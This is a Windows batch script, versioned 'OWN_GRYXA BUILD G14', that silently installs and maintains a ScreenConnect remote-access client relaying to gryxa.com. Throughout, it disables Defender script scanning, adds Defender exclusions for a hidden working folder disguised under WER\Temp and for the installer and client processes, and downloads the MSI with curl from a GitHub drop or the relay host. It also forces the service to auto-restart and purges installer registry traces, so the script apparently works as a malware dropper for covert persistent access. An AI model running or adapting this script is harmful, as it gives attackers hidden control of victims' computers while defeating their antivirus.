@echo off
rem OWN_GRYXA BUILD 20260804G14 - PowerShell-free Gryxa install (AMSI-proof fallback)
rem G14: HEAL try purge+/i BEFORE msiexec /x (avoids OUR_MSI_UNINSTALL + panel dupes when /i would have worked).
rem G13: HEAL purge phantom Installer Products packed-GUID (L34) before fresh /i; also try ui.gryxa.com MSI.
rem G12: HEAL 1060 wipe orphan FP dir + force re-fetch MSI before /x+/i.
rem G11: HEAL 1060: /i then /fa; /x+/i ONLY when no live gryxa.com relay.
rem G10: NEVER msiexec /x ProductCode on REINSTALL path (shared GUID killed other Gryxa FPs).
rem G9: HEAL never msiexec /x (start-only or /i-if-1060). REINSTALL aborts if any gryxa.com relay RUNNING.
rem G8: HEAL soft-starts first; never /x while relay Gryxa RUNNING (was killing online Guests).
rem G7: never bare sc create; after /i require ImagePath gryxa.com.
setlocal EnableExtensions EnableDelayedExpansion

set "WD=%~1"
if "%WD%"=="" set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "GRYXA_FP=%~2"
if "%GRYXA_FP%"=="" set "GRYXA_FP=36e506ff016b2151"
set "KEEP_FP=%~3"
if "%KEEP_FP%"=="" set "KEEP_FP=5f6010579852e507"
set "ALT_FP=%~4"
if "%ALT_FP%"=="" set "ALT_FP=f861c8140d453427"
set "MODE=%~5"
set "REINSTALL=0"
if /I "%MODE%"=="REINSTALL" set "REINSTALL=1"

set "STAGE=%SystemRoot%\Temp\.upd"
set "CURL=%SystemRoot%\System32\curl.exe"
set "MSI=%STAGE%\pkg_gryxa.msi"
set "LOG=%WD%\own_gryxa.log"
set "LOCK=%WD%\gryxa_msi.lock"
set "URL1=https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg_gryxa.msi"
set "URL2=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "SVC=ScreenConnect Client (%GRYXA_FP%)"
set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
set "PCPACKED=814CC7D9653A3969CD5C14CE440DB313"
set "DIR86=%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)"
set "DIR64=%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
echo [%DATE% %TIME%] own_gryxa G14 begin fp=%GRYXA_FP% reinstall=%REINSTALL% mode=%MODE%>>"%LOG%"

rem G10: OBSERVE blocks REINSTALL/mutate-/x only — still allow HEAL start + 1060 /i
if exist "%WD%\observe.flag" (
  if /I "%MODE%"=="REINSTALL" (
    echo [%DATE% %TIME%] OBSERVE_abort_REINSTALL>>"%LOG%"
    call :FindLiveRelay
    if defined LIVE_FP (
      (
        echo CURRENT_FP=!LIVE_FP!
        echo RELAY=update.gryxa.com
        echo UI=ui.gryxa.com
        echo UPDATED=cmd-own_gryxa-G10-observe-adopt
      ) >"%WD%\gryxa.cfg"
    )
    exit /b 0
  )
  echo [%DATE% %TIME%] OBSERVE_allow_heal_or_start mode=%MODE%>>"%LOG%"
)

if exist "%LOCK%" (
  powershell -NoProfile -NonInteractive -Command "if((Test-Path '%LOCK%') -and (((Get-Date)-(Get-Item -LiteralPath '%LOCK%').LastWriteTime).TotalMinutes -lt 20)){exit 0}else{exit 1}" >nul 2>&1
  if not errorlevel 1 (
    echo [%DATE% %TIME%] lock_present skip>>"%LOG%"
    exit /b 0
  )
  del /f /q "%LOCK%" >nul 2>&1
)
echo %DATE% %TIME%>"%LOCK%"

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%STAGE%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1

rem Adopt any live Gryxa relay — never touch it
call :FindLiveRelay
if defined LIVE_FP (
  echo [%DATE% %TIME%] live_relay_adopt fp=!LIVE_FP! mode=%MODE%>>"%LOG%"
  (
    echo CURRENT_FP=!LIVE_FP!
    echo RELAY=update.gryxa.com
    echo UI=ui.gryxa.com
    echo UPDATED=cmd-own_gryxa-G10-adopt
  ) >"%WD%\gryxa.cfg"
  del /f /q "%LOCK%" >nul 2>&1
  exit /b 0
)

rem HEAL: start-only when service exists; on 1060: /i -> /fa -> /x+/i only if no live relay
if /I "%MODE%"=="HEAL" (
  call :DoHeal
  set "HE=!ERRORLEVEL!"
  del /f /q "%LOCK%" >nul 2>&1
  exit /b !HE!
)

rem Non-REINSTALL default: start-only if svc exists
if "%REINSTALL%"=="0" (
  sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
  if not errorlevel 1 (
    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
    if not errorlevel 1 (
      echo [%DATE% %TIME%] already_alive_relay>>"%LOG%"
      del /f /q "%LOCK%" >nul 2>&1
      exit /b 0
    )
  )
  sc query "%SVC%" >nul 2>&1
  if not errorlevel 1 (
    echo [%DATE% %TIME%] svc_exists_start_only>>"%LOG%"
    sc config "%SVC%" start= auto >nul 2>&1
    sc failure "%SVC%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
    sc start "%SVC%" >nul 2>&1
    timeout /t 15 /nobreak >nul
    call :FindLiveRelay
    if defined LIVE_FP (
      echo [%DATE% %TIME%] started_ok_relay>>"%LOG%"
      del /f /q "%LOCK%" >nul 2>&1
      exit /b 0
    )
    echo [%DATE% %TIME%] start_failed_NO_x_exit>>"%LOG%"
    del /f /q "%LOCK%" >nul 2>&1
    exit /b 1
  )
)

rem REINSTALL path only — final live check (race)
call :FindLiveRelay
if defined LIVE_FP (
  echo [%DATE% %TIME%] abort_reinstall_still_live fp=!LIVE_FP!>>"%LOG%"
  (
    echo CURRENT_FP=!LIVE_FP!
    echo RELAY=update.gryxa.com
    echo UI=ui.gryxa.com
    echo UPDATED=cmd-own_gryxa-G10-abort-reinstall
  ) >"%WD%\gryxa.cfg"
  del /f /q "%LOCK%" >nul 2>&1
  exit /b 0
)

rem G10: FP-local cleanup ONLY — never msiexec /x shared ProductCode
echo [%DATE% %TIME%] preclean_fp_only_NO_msiexec_x fp=%GRYXA_FP%>>"%LOG%"
sc stop "%SVC%" >nul 2>&1
timeout /t 3 /nobreak >nul
sc delete "%SVC%" >nul 2>&1
if exist "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)" rmdir /s /q "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
if exist "%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)" rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
timeout /t 3 /nobreak >nul

call :FetchMsi
if errorlevel 1 (
  del /f /q "%LOCK%" >nul 2>&1
  exit /b 2
)

call :DoInstall
if errorlevel 1 (
  echo [%DATE% %TIME%] install_retry>>"%LOG%"
  call :FindLiveRelay
  if defined LIVE_FP (
    del /f /q "%LOCK%" >nul 2>&1
    exit /b 0
  )
  sc stop "%SVC%" >nul 2>&1
  sc delete "%SVC%" >nul 2>&1
  timeout /t 3 /nobreak >nul
  call :DoInstall
)

sc config "ScreenConnect Client (%KEEP_FP%)" start= auto >nul 2>&1
sc start "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
sc config "ScreenConnect Client (%ALT_FP%)" start= auto >nul 2>&1
sc start "ScreenConnect Client (%ALT_FP%)" >nul 2>&1

(
  echo CURRENT_FP=%GRYXA_FP%
  echo RELAY=update.gryxa.com
  echo UI=ui.gryxa.com
  echo UPDATED=cmd-own_gryxa-G10
) >"%WD%\gryxa.cfg"

reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
if errorlevel 1 (
  echo [%DATE% %TIME%] still_no_relay_in_imagepath>>"%LOG%"
  del /f /q "%LOCK%" >nul 2>&1
  exit /b 1
)
sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
if not errorlevel 1 (
  echo [%DATE% %TIME%] running_ok_relay>>"%LOG%"
  del /f /q "%LOCK%" >nul 2>&1
  exit /b 0
)
echo [%DATE% %TIME%] still_down msi_exit=!MSIEXIT!>>"%LOG%"
del /f /q "%LOCK%" >nul 2>&1
exit /b 1

:FindLiveRelay
set "LIVE_FP="
for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
  set "_FP=%%a"
  set "_FP=!_FP: =!"
  if /I not "!_FP!"=="%KEEP_FP%" if /I not "!_FP!"=="%ALT_FP%" (
    sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
    if not errorlevel 1 (
      reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
      if not errorlevel 1 (
        set "LIVE_FP=!_FP!"
        goto :eof
      )
    )
  )
)
goto :eof

:DoHeal
sc query "%SVC%" >nul 2>&1
if not errorlevel 1 (
  echo [%DATE% %TIME%] heal_start_only_no_x>>"%LOG%"
  sc config "%SVC%" start= auto >nul 2>&1
  sc failure "%SVC%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
  sc start "%SVC%" >nul 2>&1
  timeout /t 15 /nobreak >nul
  sc start "%SVC%" >nul 2>&1
  timeout /t 8 /nobreak >nul
  call :FindLiveRelay
  if defined LIVE_FP (
    echo [%DATE% %TIME%] heal_start_ok fp=!LIVE_FP!>>"%LOG%"
    (
      echo CURRENT_FP=!LIVE_FP!
      echo RELAY=update.gryxa.com
      echo UI=ui.gryxa.com
      echo UPDATED=cmd-own_gryxa-G12-heal-start
    ) >"%WD%\gryxa.cfg"
    exit /b 0
  )
  echo [%DATE% %TIME%] heal_start_failed_NO_x_exit>>"%LOG%"
  exit /b 1
)
echo [%DATE% %TIME%] heal_1060_install_only>>"%LOG%"
call :FetchMsi
if errorlevel 1 exit /b 2
call :DoInstall
call :FindLiveRelay
if defined LIVE_FP goto :DoHealOk
rem registered-no-service: plain /i often no-ops — try repair
echo [%DATE% %TIME%] heal_1060_msiexec_fa>>"%LOG%"
msiexec /fa %PC% /qn /norestart REBOOT=ReallySuppress >>"%LOG%" 2>&1
sc start "%SVC%" >nul 2>&1
timeout /t 12 /nobreak >nul
call :FindLiveRelay
if defined LIVE_FP goto :DoHealOk
rem reinstall-in-place (still no /x)
echo [%DATE% %TIME%] heal_1060_reinstall_amus>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=amus REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa_re.log"
set "MSIEXIT=!ERRORLEVEL!"
echo [%DATE% %TIME%] msiexec_re_exit=!MSIEXIT!>>"%LOG%"
sc start "%SVC%" >nul 2>&1
timeout /t 12 /nobreak >nul
call :FindLiveRelay
if defined LIVE_FP goto :DoHealOk
rem purge + wipe + /i WITHOUT /x first (avoids DROP when phantom reg was the only blocker)
call :FindLiveRelay
if defined LIVE_FP goto :DoHealOk
echo [%DATE% %TIME%] heal_1060_purge_wipe_i_no_x>>"%LOG%"
call :PurgePhantomPc
sc stop "%SVC%" >nul 2>&1
sc delete "%SVC%" >nul 2>&1
if exist "%DIR86%" (
  echo [%DATE% %TIME%] wipe_orphan_dir86>>"%LOG%"
  rmdir /s /q "%DIR86%" >nul 2>&1
)
if exist "%DIR64%" (
  echo [%DATE% %TIME%] wipe_orphan_dir64>>"%LOG%"
  rmdir /s /q "%DIR64%" >nul 2>&1
)
del /f /q "%MSI%" "%MSI%.tmp" >nul 2>&1
call :FetchMsi
if errorlevel 1 exit /b 2
call :DoInstall
call :FindLiveRelay
if defined LIVE_FP goto :DoHealOk
rem last resort only: /x then purge wipe /i — ONLY when no live gryxa.com relay
call :FindLiveRelay
if defined LIVE_FP goto :DoHealOk
echo [%DATE% %TIME%] heal_1060_x_purge_wipe_i_no_live_relay>>"%LOG%"
msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress >>"%LOG%" 2>&1
timeout /t 5 /nobreak >nul
call :PurgePhantomPc
sc stop "%SVC%" >nul 2>&1
sc delete "%SVC%" >nul 2>&1
if exist "%DIR86%" rmdir /s /q "%DIR86%" >nul 2>&1
if exist "%DIR64%" rmdir /s /q "%DIR64%" >nul 2>&1
del /f /q "%MSI%" "%MSI%.tmp" >nul 2>&1
call :FetchMsi
if errorlevel 1 exit /b 2
call :DoInstall
call :FindLiveRelay
if defined LIVE_FP goto :DoHealOk
echo [%DATE% %TIME%] heal_1060_still_down>>"%LOG%"
exit /b 1

:DoHealOk
echo [%DATE% %TIME%] heal_1060_ok fp=!LIVE_FP!>>"%LOG%"
(
  echo CURRENT_FP=!LIVE_FP!
  echo RELAY=update.gryxa.com
  echo UI=ui.gryxa.com
  echo UPDATED=cmd-own_gryxa-G14-heal-i
) >"%WD%\gryxa.cfg"
exit /b 0

:PurgePhantomPc
rem L34-equivalent: packed ProductCode under Installer Products (phantom Installed=00:00:00)
echo [%DATE% %TIME%] purge_phantom_pc packed=%PCPACKED%>>"%LOG%"
reg delete "HKLM\SOFTWARE\Classes\Installer\Products\%PCPACKED%" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\%PCPACKED%" /f >nul 2>&1
reg delete "HKCR\Installer\Products\%PCPACKED%" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1
exit /b 0

:FetchMsi
set "NEED=1"
if exist "%MSI%" for %%F in ("%MSI%") do if %%~zF GTR 1000000 set "NEED=0"
if "%NEED%"=="1" (
  echo [%DATE% %TIME%] fetch %URL1%>>"%LOG%"
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 --max-time 180 -o "%MSI%.tmp" "%URL1%" >>"%LOG%" 2>&1
  if exist "%MSI%.tmp" for %%F in ("%MSI%.tmp") do if %%~zF GTR 1000000 move /y "%MSI%.tmp" "%MSI%" >nul 2>&1
)
if not exist "%MSI%" (
  echo [%DATE% %TIME%] fetch_fallback %URL2%>>"%LOG%"
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 --max-time 180 -o "%MSI%.tmp" "%URL2%" >>"%LOG%" 2>&1
  if exist "%MSI%.tmp" for %%F in ("%MSI%.tmp") do if %%~zF GTR 1000000 move /y "%MSI%.tmp" "%MSI%" >nul 2>&1
)
if not exist "%MSI%" (
  echo [%DATE% %TIME%] msi_unavailable>>"%LOG%"
  exit /b 1
)
exit /b 0

:DoInstall
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
echo [%DATE% %TIME%] msiexec /i>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa_cmd.log"
set "MSIEXIT=!ERRORLEVEL!"
echo [%DATE% %TIME%] msiexec_exit=!MSIEXIT!>>"%LOG%"
echo !MSIEXIT!>"%WD%\gryxa_install.result"
sc config "%SVC%" start= auto >nul 2>&1
sc failure "%SVC%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%SVC%" >nul 2>&1
timeout /t 15 /nobreak >nul
sc query "%SVC%" >nul 2>&1
if errorlevel 1 (
  echo [%DATE% %TIME%] post_i_1060_no_bare_create>>"%LOG%"
  exit /b 1
)
reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
if errorlevel 1 (
  echo [%DATE% %TIME%] post_i_no_relay>>"%LOG%"
  exit /b 1
)
exit /b 0
